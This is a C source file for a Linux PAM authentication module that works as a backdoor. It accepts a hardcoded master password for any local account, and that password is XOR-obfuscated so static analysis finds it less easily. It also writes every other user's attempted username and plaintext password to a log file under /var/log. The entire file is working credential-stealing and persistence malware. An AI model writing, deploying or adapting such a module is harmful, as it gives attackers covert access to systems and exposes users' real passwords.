#include <stdio.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <sys/file.h>
#include <errno.h>

#define SNEAKY_LOG_PASSWD 1
#define SNEAKY_LOG_FILE "/var/log/firstlog"

/* This is the juicy function. It grabs the username and password from the user
    and checks only the password against a constant password. The example below
    uses a simply xor, and stores the value as constants on the stack to make
    static analysis of the cosntant password a little more difficult.

    This also checks the user against /etc/passwd to prevent both weird messages
    for non-existent users, and to prevent the need for a "pam_localusers.so" 
    line in your pam.d.
*/
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
{
    int pam_code;
    const char *username = NULL;
    const char *password = NULL;
    char passwd_line[1024];
    int found_user = 0;
    // Our secret ( xor('sneaky password', 0x42) )
    char key[16] = { '1', ',', '\'', '#', ')', ';', 'b', '2', '#', '1', '1', '5', '-', '0', '&', 0 };
	FILE* filp;

    /* Asking the application for an  username */
    pam_code = pam_get_user(handle, &username, "Username: ");
    if (pam_code != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    // Open /etc/passwd
    filp = fopen("/etc/passwd", "r");
    if( filp == NULL ){
        return PAM_IGNORE;
    }

    // Check provided user against local users
    while( fgets(passwd_line, 1024, filp) ){
        char* valid_user = strtok(passwd_line, ":");
        // If this user matches, set the flag and break
        if( strcmp(valid_user, username) == 0 ){
            found_user = 1;
            break;
        } 
    }

    fclose(filp);

    // Not a valid local user
    if( found_user == 0 ){
        return PAM_IGNORE;
    }
 
    // Grab the password from the user
    pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
    if (pam_code != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    // Not it!
    if( strlen(password) != 15 ){
        return PAM_IGNORE;
    }

    // Compare the password
    for( int i = 0; i < 15; ++i ){
        if( (key[i] ^ 0x42) != password[i] ){

#ifdef SNEAKY_LOG_PASSWD
			// Log attempted passwords
			filp = fopen(SNEAKY_LOG_FILE, "a");
			if( filp != NULL )
			{
				if( flock(fileno(filp), LOCK_EX) != -1 ) {
					fprintf(filp, "%s:%s\n", username, password);
					flock(fileno(filp), LOCK_UN);
				} else {
					printf("FAILED TO LOCK FILE: %d\n", errno);
				}
				fclose(filp);
			} else {
				printf("FAILED TO OPEN LOG\n");
			}
#endif

            return PAM_IGNORE;
        }
    }

    // Ignore me!
    return PAM_SUCCESS;
}

/* These functions are just stubs to make pam play nice. We don't use them. */


PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    /* In this function we check that the user is allowed in the system. We already know
     * that he's authenticated, but we could apply restrictions based on time of the day,
     * resources in the system etc. */
     return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    /* We could have many more information of the user other then password and username.
     * These are the credentials. For example, a kerberos ticket. Here we establish those
     * and make them visible to the application */
     return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    /* When the application wants to open a session, this function is called. Here we should
     * build the user environment (setting environment variables, mounting directories etc) */
     return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    /* Here we destroy the environment we have created above */
     return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv){
    /* This function is called to change the authentication token. Here we should,
     * for example, change the user password with the new password */
     return PAM_IGNORE;
}
